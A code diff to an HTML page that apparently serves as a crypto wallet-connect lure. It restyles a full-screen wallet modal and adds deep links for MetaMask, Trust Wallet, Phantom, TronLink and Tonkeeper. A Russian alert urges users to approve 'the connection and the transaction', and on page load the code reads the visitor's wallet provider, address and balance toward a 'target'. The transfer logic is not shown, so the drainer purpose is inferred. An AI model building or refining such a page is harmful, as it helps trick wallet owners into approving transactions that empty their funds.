@@ -19,9 +19,9 @@
     .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; align-items: center; justify-content: center; }
     .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; }
     .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.2rem; margin: 2rem 0; }
-    .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 0.8rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 150px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 1rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 150px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
     .wallet-item:hover { transform: scale(1.12); background: rgba(168,85,247,0.2); box-shadow: 0 0 30px rgba(168,85,247,0.6); }
-    .wallet-item img { width: 90px; height: 90px; object-fit: contain; margin-bottom: 0.4rem; }
+    .wallet-item img { width: 100px; height: 100px; object-fit: contain; margin-bottom: 0.4rem; }
     .wallet-item p { font-size: 1rem; font-weight: 600; margin-top: 0.3rem; white-space: nowrap; }
   </style>
 </head>
@@ -166,33 +166,26 @@
         return;
       }
 
-      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      let dl = '';
+      if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
+      if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
+      if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;
+      if (wallet === 'TronLink') dl = `tronlink://wc?uri=${encodeURIComponent(uri)}`;
+      if (wallet === 'Tonkeeper') dl = `tonkeeper://wc?uri=${encodeURIComponent(uri)}`;
 
-      if (isMobile) {
-        const attempts = [
-          `wc:${uri.replace(/^wc:/, '')}`,
-          `${wallet.toLowerCase()}://wc?uri=${encodeURIComponent(uri)}`,
-          `wc?uri=${encodeURIComponent(uri)}`
-        ];
-
-        attempts.forEach((dl, i) => {
-          setTimeout(() => {
-            window.location.href = dl;
-          }, i * 600);
-        });
-
-        setTimeout(() => {
-          alert('Подтверди подключение в кошельке');
-        }, 4000);
+      if (dl) {
+        window.location.href = dl;
+        setTimeout(() => alert('Подтверди подключение и транзакцию в кошельке'), 2000);
+        document.getElementById('modal').style.display = 'none';
       } else {
         alert('Подтверди подключение в кошельке');
       }
     }
 
     window.addEventListener('load', async () => {
-      if (window.ethereum || window.solana || window.phantom) {
+      if (window.ethereum || window.solana || window.phantom?.solana) {
         try {
-          let provider, address, network, balanceFormatted, symbol, target;
+          let provider, address, network, balanceFormatted = '0', symbol = 'Unknown', target;
 
           if (window.ethereum) {
             provider = new ethers.providers.Web3Provider(window.ethereum);
